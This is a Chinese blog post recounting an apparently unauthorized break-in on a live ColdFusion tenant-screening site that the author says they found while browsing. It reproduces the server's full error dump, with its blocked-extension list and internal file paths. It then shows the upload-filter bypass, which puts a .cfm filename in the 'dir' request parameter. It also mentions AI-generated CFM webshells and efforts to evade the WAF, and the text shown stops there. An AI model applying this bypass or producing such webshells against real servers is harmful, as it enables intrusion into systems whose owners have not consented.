@@ -1,0 +1,418 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="日常冲浪发现一个CFM后端的站点，通过FUZZ找到文件上传接口，然后开始测试，发现无法上传文件，会报错，报错内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFM后端渗透上传shell">
+<meta property="og:url" content="http://example.com/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="日常冲浪发现一个CFM后端的站点，通过FUZZ找到文件上传接口，然后开始测试，发现无法上传文件，会报错，报错内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-57-46-image.png">
+<meta property="og:image" content="http://example.com/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-58-25-image.png">
+<meta property="og:image" content="http://example.com/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-59-21-image.png">
+<meta property="article:published_time" content="2026-07-18T08:10:01.000Z">
+<meta property="article:modified_time" content="2026-07-19T15:18:06.776Z">
+<meta property="article:author" content="0ldcat">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-57-46-image.png">
+  
+  
+  <title>CFM后端渗透上传shell - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"...","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CFM后端渗透上传shell">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2026-07-18 16:10" pubdate>
+        2026年7月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.6k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      72 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CFM后端渗透上传shell</h1>
+            
+            <div class="markdown-body">
+              <p>日常冲浪发现一个CFM后端的站点，通过FUZZ找到文件上传接口，然后开始测试，发现无法上传文件，会报错，报错内容如下：</p>
+<figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell"><span class="hljs-type">Landlord</span> <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span><br><br><span class="hljs-type">Search</span><br><span class="hljs-type">Home</span><br><span class="hljs-type">Contact</span><br><span class="hljs-type">Search</span><br><span class="hljs-type">Error</span>!<br><span class="hljs-type">We&#x27;re</span> sorry, but an error has occured while processing your request.<br><br><span class="hljs-type">An</span> error occured while processing a document. <span class="hljs-type">Here</span> is the relevant information:<br><span class="hljs-type">Date</span>:    <span class="hljs-number">7</span>/<span class="hljs-number">18</span>/<span class="hljs-number">26</span> <span class="hljs-number">2</span>:<span class="hljs-number">45</span> <span class="hljs-type">AM</span><br><span class="hljs-type">Script</span> <span class="hljs-type">Name</span>:    /blog/admin/filemanager.cfm?dir=%2F<br><span class="hljs-type">Browser</span>:    <span class="hljs-type">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-type">Windows</span> <span class="hljs-type">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-type">Win64</span>; x64; rv:<span class="hljs-number">142.0</span>) <span class="hljs-type">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-type">Firefox</span>/<span class="hljs-number">142.0</span><br><span class="hljs-type">Referer</span>:    https://www.***.com/blog/admin/filemanager.cfm<br><span class="hljs-type">Message</span>:    <span class="hljs-type">The</span> <span class="hljs-type">MIME</span> <span class="hljs-class"><span class="hljs-keyword">type</span> or the <span class="hljs-type">Extension</span> of the uploaded file cfm was not accepted by the server.</span><br><span class="hljs-type">Type</span>:    coldfusion.runtime.<span class="hljs-type">CfErrorWrapper</span><br><span class="hljs-type">Root</span> <span class="hljs-type">Cause</span>:    <br><span class="hljs-title">struct</span><br><span class="hljs-type">Block</span>    <span class="hljs-type">AS</span>,<span class="hljs-type">ASP</span>,<span class="hljs-type">ASPX</span>,<span class="hljs-type">BIN</span>,<span class="hljs-type">DMG</span>,<span class="hljs-type">CFC</span>,<span class="hljs-type">CFM</span>,<span class="hljs-type">CFML</span>,<span class="hljs-type">CFR</span>,<span class="hljs-type">CFSWF</span>,<span class="hljs-type">EXE</span>,<span class="hljs-type">HBXML</span>,<span class="hljs-type">JSP</span>,<span class="hljs-type">JSPX</span>,<span class="hljs-type">JWS</span>,<span class="hljs-type">MXML</span>,<span class="hljs-type">PHP</span>,<span class="hljs-type">SWC</span>,<span class="hljs-type">SWS</span><br><span class="hljs-type">Detail</span>    <span class="hljs-type">Files</span> <span class="hljs-keyword">of</span> <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-type">AS</span>,<span class="hljs-type">ASP</span>,<span class="hljs-type">ASPX</span>,<span class="hljs-type">BIN</span>,<span class="hljs-type">DMG</span>,<span class="hljs-type">CFC</span>,<span class="hljs-type">CFM</span>,<span class="hljs-type">CFML</span>,<span class="hljs-type">CFR</span>,<span class="hljs-type">CFSWF</span>,<span class="hljs-type">EXE</span>,<span class="hljs-type">HBXML</span>,<span class="hljs-type">JSP</span>,<span class="hljs-type">JSPX</span>,<span class="hljs-type">JWS</span>,<span class="hljs-type">MXML</span>,<span class="hljs-type">PHP</span>,<span class="hljs-type">SWC</span>,<span class="hljs-type">SWS</span> are blocked. <span class="hljs-type">Verify</span> that you are uploading a file of the appropriate <span class="hljs-keyword">type</span>.</span><br><span class="hljs-type">Message</span>    <span class="hljs-type">The</span> <span class="hljs-type">MIME</span> <span class="hljs-class"><span class="hljs-keyword">type</span> or the <span class="hljs-type">Extension</span> of the uploaded file cfm was not accepted by the server.</span><br><span class="hljs-type">MimeType</span>    cfm<br><span class="hljs-type">StackTrace</span>    coldfusion.tagext.io.<span class="hljs-type">FileUtils</span>$<span class="hljs-type">BlockedUploadTypeException</span>: <span class="hljs-type">The</span> <span class="hljs-type">MIME</span> <span class="hljs-class"><span class="hljs-keyword">type</span> or the <span class="hljs-type">Extension</span> of the uploaded file cfm was not accepted by the server. at coldfusion.tagext.io.<span class="hljs-type">FileUtils</span>.checkisBlocked(<span class="hljs-type">FileUtils</span>.<span class="hljs-title">java</span>:1028) at coldfusion.tagext.io.<span class="hljs-type">FileUtils</span>.matchExtensions(<span class="hljs-type">FileUtils</span>.<span class="hljs-title">java</span>:2092) at coldfusion.tagext.io.<span class="hljs-type">FileUtils</span>.uploadFile(<span class="hljs-type">FileUtils</span>.<span class="hljs-title">java</span>:786) at coldfusion.tagext.io.<span class="hljs-type">FileTag</span>.upload(<span class="hljs-type">FileTag</span>.<span class="hljs-title">java</span>:798) at coldfusion.tagext.io.<span class="hljs-type">FileTag</span>.doStartTag(<span class="hljs-type">FileTag</span>.<span class="hljs-title">java</span>:370) at coldfusion.runtime.<span class="hljs-type">CfJspPage</span>._emptyTcfTag(<span class="hljs-type">CfJspPage</span>.<span class="hljs-title">java</span>:5083) at cffilemanager2ecfm233871334.runPage(<span class="hljs-type">C</span>:\<span class="hljs-title">inetpub</span>\<span class="hljs-title">wwwroot</span>\<span class="hljs-type">Sites</span>\<span class="hljs-type">TenantBackgroundSearch</span>\<span class="hljs-title">blog</span>\<span class="hljs-title">admin</span>\<span class="hljs-title">filemanager</span>.<span class="hljs-title">cfm</span>:48) at coldfusion.runtime.<span class="hljs-type">CfJspPage</span>.invoke(<span class="hljs-type">CfJspPage</span>.<span class="hljs-title">java</span>:251) at coldfusion.tagext.lang.<span class="hljs-type">IncludeTag</span>.handlePageInvoke(<span class="hljs-type">IncludeTag</span>.<span class="hljs-title">java</span>:749) at coldfusion.tagext.lang.<span class="hljs-type">IncludeTag</span>.doStartTag(<span class="hljs-type">IncludeTag</span>.<span class="hljs-title">java</span>:578) at coldfusion.filter.<span class="hljs-type">CfincludeFilter</span>.invoke(<span class="hljs-type">CfincludeFilter</span>.<span class="hljs-title">java</span>:65) at coldfusion.filter.<span class="hljs-type">ApplicationFilter</span>.invoke(<span class="hljs-type">ApplicationFilter</span>.<span class="hljs-title">java</span>:613) at coldfusion.filter.<span class="hljs-type">RequestMonitorFilter</span>.invoke(<span class="hljs-type">RequestMonitorFilter</span>.<span class="hljs-title">java</span>:43) at coldfusion.filter.<span class="hljs-type">MonitoringFilter</span>.invoke(<span class="hljs-type">MonitoringFilter</span>.<span class="hljs-title">java</span>:40) at coldfusion.filter.<span class="hljs-type">PathFilter</span>.invoke(<span class="hljs-type">PathFilter</span>.<span class="hljs-title">java</span>:162) at coldfusion.filter.<span class="hljs-type">IpFilter</span>.invoke(<span class="hljs-type">IpFilter</span>.<span class="hljs-title">java</span>:45) at coldfusion.filter.<span class="hljs-type">ExceptionFilter</span>.invoke(<span class="hljs-type">ExceptionFilter</span>.<span class="hljs-title">java</span>:97) at coldfusion.filter.<span class="hljs-type">BrowserDebugFilter</span>.invoke(<span class="hljs-type">BrowserDebugFilter</span>.<span class="hljs-title">java</span>:81) at coldfusion.filter.<span class="hljs-type">ClientScopePersistenceFilter</span>.invoke(<span class="hljs-type">ClientScopePersistenceFilter</span>.<span class="hljs-title">java</span>:28) at coldfusion.filter.<span class="hljs-type">BrowserFilter</span>.invoke(<span class="hljs-type">BrowserFilter</span>.<span class="hljs-title">java</span>:38) at coldfusion.filter.<span class="hljs-type">NoCacheFilter</span>.invoke(<span class="hljs-type">NoCacheFilter</span>.<span class="hljs-title">java</span>:60) at coldfusion.filter.<span class="hljs-type">GlobalsFilter</span>.invoke(<span class="hljs-type">GlobalsFilter</span>.<span class="hljs-title">java</span>:38) at coldfusion.filter.<span class="hljs-type">DatasourceFilter</span>.invoke(<span class="hljs-type">DatasourceFilter</span>.<span class="hljs-title">java</span>:22) at coldfusion.filter.<span class="hljs-type">CachingFilter</span>.invoke(<span class="hljs-type">CachingFilter</span>.<span class="hljs-title">java</span>:62) at coldfusion.filter.<span class="hljs-type">RequestThrottleFilter</span>.invoke(<span class="hljs-type">RequestThrottleFilter</span>.<span class="hljs-title">java</span>:154) at coldfusion.<span class="hljs-type">CfmServlet</span>.service(<span class="hljs-type">CfmServlet</span>.<span class="hljs-title">java</span>:231) at coldfusion.bootstrap.<span class="hljs-type">BootstrapServlet</span>.service(<span class="hljs-type">BootstrapServlet</span>.<span class="hljs-title">java</span>:311) at org.apache.catalina.core.<span class="hljs-type">ApplicationFilterChain</span>.internalDoFilter(<span class="hljs-type">ApplicationFilterChain</span>.<span class="hljs-title">java</span>:197) at org.apache.catalina.core.<span class="hljs-type">ApplicationFilterChain</span>.doFilter(<span class="hljs-type">ApplicationFilterChain</span>.<span class="hljs-title">java</span>:142) at coldfusion.monitor.event.<span class="hljs-type">MonitoringServletFilter</span>.doFilter(<span class="hljs-type">MonitoringServletFilter</span>.<span class="hljs-title">java</span>:46) at coldfusion.bootstrap.<span class="hljs-type">BootstrapFilter</span>.doFilter(<span class="hljs-type">BootstrapFilter</span>.<span class="hljs-title">java</span>:47) at org.apache.catalina.core.<span class="hljs-type">ApplicationFilterChain</span>.internalDoFilter(<span class="hljs-type">ApplicationFilterChain</span>.<span class="hljs-title">java</span>:166) at org.apache.catalina.core.<span class="hljs-type">ApplicationFilterChain</span>.doFilter(<span class="hljs-type">ApplicationFilterChain</span>.<span class="hljs-title">java</span>:142) at org.apache.catalina.core.<span class="hljs-type">StandardWrapperValve</span>.invoke(<span class="hljs-type">StandardWrapperValve</span>.<span class="hljs-title">java</span>:166) at org.apache.catalina.core.<span class="hljs-type">StandardContextValve</span>.invoke(<span class="hljs-type">StandardContextValve</span>.<span class="hljs-title">java</span>:88) at org.apache.catalina.authenticator.<span class="hljs-type">AuthenticatorBase</span>.invoke(<span class="hljs-type">AuthenticatorBase</span>.<span class="hljs-title">java</span>:491) at org.apache.catalina.core.<span class="hljs-type">StandardHostValve</span>.invoke(<span class="hljs-type">StandardHostValve</span>.<span class="hljs-title">java</span>:127) at org.apache.catalina.valves.<span class="hljs-type">ErrorReportValve</span>.invoke(<span class="hljs-type">ErrorReportValve</span>.<span class="hljs-title">java</span>:83) at org.apache.catalina.core.<span class="hljs-type">StandardEngineValve</span>.invoke(<span class="hljs-type">StandardEngineValve</span>.<span class="hljs-title">java</span>:72) at org.apache.catalina.connector.<span class="hljs-type">CoyoteAdapter</span>.service(<span class="hljs-type">CoyoteAdapter</span>.<span class="hljs-title">java</span>:357) at org.apache.coyote.ajp.<span class="hljs-type">AjpProcessor</span>.service(<span class="hljs-type">AjpProcessor</span>.<span class="hljs-title">java</span>:453) at org.apache.coyote.<span class="hljs-type">AbstractProcessorLight</span>.process(<span class="hljs-type">AbstractProcessorLight</span>.<span class="hljs-title">java</span>:63) at org.apache.coyote.<span class="hljs-type">AbstractProtocol</span>$<span class="hljs-type">ConnectionHandler</span>.process(<span class="hljs-type">AbstractProtocol</span>.<span class="hljs-title">java</span>:1309) at org.apache.tomcat.util.net.<span class="hljs-type">NioEndpoint</span>$<span class="hljs-type">SocketProcessor</span>.doRun(<span class="hljs-type">NioEndpoint</span>.<span class="hljs-title">java</span>:1854) at org.apache.tomcat.util.net.<span class="hljs-type">SocketProcessorBase</span>.run(<span class="hljs-type">SocketProcessorBase</span>.<span class="hljs-title">java</span>:52) at org.apache.tomcat.util.threads.<span class="hljs-type">ThreadPoolExecutor</span>.runWorker(<span class="hljs-type">ThreadPoolExecutor</span>.<span class="hljs-title">java</span>:973) at org.apache.tomcat.util.threads.<span class="hljs-type">ThreadPoolExecutor</span>$<span class="hljs-type">Worker</span>.run(<span class="hljs-type">ThreadPoolExecutor</span>.<span class="hljs-title">java</span>:491) at org.apache.tomcat.util.threads.<span class="hljs-type">TaskThread</span>$<span class="hljs-type">WrappingRunnable</span>.run(<span class="hljs-type">TaskThread</span>.<span class="hljs-title">java</span>:63) at java.base/java.lang.<span class="hljs-type">Thread</span>.run(<span class="hljs-type">Thread</span>.<span class="hljs-title">java</span>:842)</span><br><span class="hljs-type">Suppressed</span>    <br><span class="hljs-title">array</span>[empty]<br><span class="hljs-type">TagContext</span>    <br><span class="hljs-title">array</span><br><span class="hljs-number">1</span>    <br><span class="hljs-title">struct</span><br><span class="hljs-type">COLUMN</span>    <span class="hljs-number">0</span><br><span class="hljs-type">ID</span>    <span class="hljs-type">CFFILE</span><br><span class="hljs-type">LINE</span>    <span class="hljs-number">48</span><br><span class="hljs-type">RAW_TRACE</span>    at cffilemanager2ecfm233871334.runPage(<span class="hljs-type">C</span>:\inetpub\wwwroot\<span class="hljs-type">Sites</span>\<span class="hljs-type">TenantBackgroundSearch</span>\blog\admin\filemanager.cfm:<span class="hljs-number">48</span>)<br><span class="hljs-type">TEMPLATE</span>    <span class="hljs-type">C</span>:\inetpub\wwwroot\<span class="hljs-type">Sites</span>\<span class="hljs-type">TenantBackgroundSearch</span>\blog\admin\filemanager.cfm<br><span class="hljs-type">TYPE</span>    <span class="hljs-type">CFML</span><br><span class="hljs-type">Type</span>    <span class="hljs-type">Application</span><br><span class="hljs-type">Tag</span> <span class="hljs-type">Context</span>:    <br><span class="hljs-title">array</span><br><span class="hljs-number">1</span>    <br><span class="hljs-title">struct</span><br><span class="hljs-type">COLUMN</span>    <span class="hljs-number">0</span><br><span class="hljs-type">ID</span>    <span class="hljs-type">CFFILE</span><br><span class="hljs-type">LINE</span>    <span class="hljs-number">48</span><br><span class="hljs-type">RAW_TRACE</span>    at cffilemanager2ecfm233871334.runPage(<span class="hljs-type">C</span>:\inetpub\wwwroot\<span class="hljs-type">Sites</span>\<span class="hljs-type">TenantBackgroundSearch</span>\blog\admin\filemanager.cfm:<span class="hljs-number">48</span>)<br><span class="hljs-type">TEMPLATE</span>    <span class="hljs-type">C</span>:\inetpub\wwwroot\<span class="hljs-type">Sites</span>\<span class="hljs-type">TenantBackgroundSearch</span>\blog\admin\filemanager.cfm<br><span class="hljs-type">TYPE</span>    <span class="hljs-type">CFML</span><br><span class="hljs-type">Calendar</span><br>&lt;&lt; <span class="hljs-type">July</span> <span class="hljs-number">2026</span> &gt;&gt;<br><span class="hljs-type">Sun</span>    <span class="hljs-type">Mon</span>    <span class="hljs-type">Tue</span>    <span class="hljs-type">Wed</span>    <span class="hljs-type">Thu</span>    <span class="hljs-type">Fri</span>    <span class="hljs-type">Sat</span><br>               <span class="hljs-number">1</span>    <span class="hljs-number">2</span>    <span class="hljs-number">3</span>    <span class="hljs-number">4</span><br><span class="hljs-number">5</span>    <span class="hljs-number">6</span>    <span class="hljs-number">7</span>    <span class="hljs-number">8</span>    <span class="hljs-number">9</span>    <span class="hljs-number">10</span>    <span class="hljs-number">11</span><br><span class="hljs-number">12</span>    <span class="hljs-number">13</span>    <span class="hljs-number">14</span>    <span class="hljs-number">15</span>    <span class="hljs-number">16</span>    <span class="hljs-number">17</span>    <span class="hljs-number">18</span><br><span class="hljs-number">19</span>    <span class="hljs-number">20</span>    <span class="hljs-number">21</span>    <span class="hljs-number">22</span>    <span class="hljs-number">23</span>    <span class="hljs-number">24</span>    <span class="hljs-number">25</span><br><span class="hljs-number">26</span>    <span class="hljs-number">27</span>    <span class="hljs-number">28</span>    <span class="hljs-number">29</span>    <span class="hljs-number">30</span>    <span class="hljs-number">31</span>     <br><span class="hljs-type">Subscribe</span><br><span class="hljs-type">Enter</span> your email address to subscribe to this blog.<br><br><br><span class="hljs-type">Recent</span> <span class="hljs-type">Comments</span><br><span class="hljs-type">Finding</span> the <span class="hljs-type">Best</span> <span class="hljs-type">Tenants</span> with <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span><br><span class="hljs-title">rogerafrance</span> said: <span class="hljs-type">Thank</span> you so much for sharing this post. [<span class="hljs-type">More</span>]<br><br><span class="hljs-type">Avoid</span> <span class="hljs-type">Dangerous</span> <span class="hljs-type">Tenants</span> with <span class="hljs-type">Online</span> <span class="hljs-type">Based</span> <span class="hljs-type">Background</span> <span class="hljs-type">Check</span><br><span class="hljs-type">Donna</span> said: <span class="hljs-type">I</span> truly believe <span class="hljs-keyword">in</span> background checks. <span class="hljs-type">The</span> company <span class="hljs-type">I</span> used did a great job and even answered trouble s... [<span class="hljs-type">More</span>]<br><br><span class="hljs-type">Rental</span> <span class="hljs-type">Staging</span> <span class="hljs-type">Can</span> <span class="hljs-type">Increase</span> <span class="hljs-type">Landlord</span> <span class="hljs-type">Profits</span> and <span class="hljs-type">Reduce</span> <span class="hljs-type">Vacancies</span><br><span class="hljs-type">YJ</span> said: <span class="hljs-type">Hi</span>, <span class="hljs-type">Is</span> there a way to contact you? <span class="hljs-type">I</span> have ordered a report. <span class="hljs-type">My</span> tenant has finished the process. <span class="hljs-type">I</span> st... [<span class="hljs-type">More</span>]<br><br><span class="hljs-type">Recent</span> <span class="hljs-type">Entries</span><br><span class="hljs-type">How</span> to <span class="hljs-type">Spot</span> a <span class="hljs-type">Fake</span> <span class="hljs-type">Pay</span> <span class="hljs-type">Stub</span> <span class="hljs-type">During</span> <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span><br><span class="hljs-type">The</span> <span class="hljs-type">Future</span> <span class="hljs-keyword">of</span> <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span> with <span class="hljs-type">AI</span> and <span class="hljs-type">Tech</span> <span class="hljs-type">Innovations</span><br><span class="hljs-type">How</span> the <span class="hljs-type">Rise</span> <span class="hljs-keyword">of</span> <span class="hljs-type">Remote</span> <span class="hljs-type">Work</span> <span class="hljs-type">Affects</span> <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span><br><span class="hljs-type">The</span> <span class="hljs-type">Benefits</span> <span class="hljs-keyword">of</span> <span class="hljs-type">Online</span> <span class="hljs-type">Tenant</span> <span class="hljs-type">Screening</span> <span class="hljs-type">Services</span><br><span class="hljs-type">The</span> <span class="hljs-type">Simple</span> <span class="hljs-type">Reason</span> <span class="hljs-type">Why</span> <span class="hljs-type">Real</span> <span class="hljs-type">Estate</span> <span class="hljs-type">Explodes</span> <span class="hljs-type">Your</span> <span class="hljs-type">Net</span> <span class="hljs-type">Worth</span><br><span class="hljs-type">Archives</span> by <span class="hljs-type">Subject</span><br><span class="hljs-type">Landlord</span> <span class="hljs-type">Advice</span> (<span class="hljs-number">56</span>) [<span class="hljs-type">RSS</span>]<br><span class="hljs-type">Real</span> <span class="hljs-type">Estate</span> <span class="hljs-type">Investing</span> (<span class="hljs-number">12</span>) [<span class="hljs-type">RSS</span>]<br><span class="hljs-type">BlogCFC</span> <span class="hljs-number">5.9</span>.<span class="hljs-number">8.012</span> by <span class="hljs-type">Raymond</span> <span class="hljs-type">Camden</span> | <span class="hljs-type">RSS</span> | <span class="hljs-type">Arclite</span> theme by digitalnature 为什么<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>文件上传功能被服务器端黑名单拦截</strong></p>
+<p><code>The MIME type or the Extension of the uploaded file cfm was not accepted by the server.</code><br>并且列出了被阻止的扩展名列表：<code>AS,ASP,ASPX,BIN,DMG,CFC,CFM,CFML,CFR,CFSWF,EXE,HBXML,JSP,JSPX,JWS,MXML,PHP,SWC,SWS</code></p>
+<p>想办法绕过</p>
+<p>查看请求包，发现</p>
+<p>POST &#x2F;blog&#x2F;admin&#x2F;filemanager.cfm?dir&#x3D;%2F HTTP&#x2F;2</p>
+<p>dir参数为路径，拼接文件名，查看回显，发现上传成功</p>
+<p>POST &#x2F;blog&#x2F;admin&#x2F;filemanager.cfm?dir&#x3D;%2F3.cfm HTTP&#x2F;2</p>
+<p><img src="/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-57-46-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>能正常访问，然后构造cfm的一句话木马</p>
+<p>使用AI生成多个木马，发现无法执行，会报错</p>
+<p><img src="/2026/07/18/CFM%E5%90%8E%E7%AB%AF%E6%B8%97%E9%80%8F%E4%B8%8A%E4%BC%A0shell/2026-07-18-20-58-25-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后能执行cmd命令的，也会被cf的WAF拦截，再次尝试绕过</p>
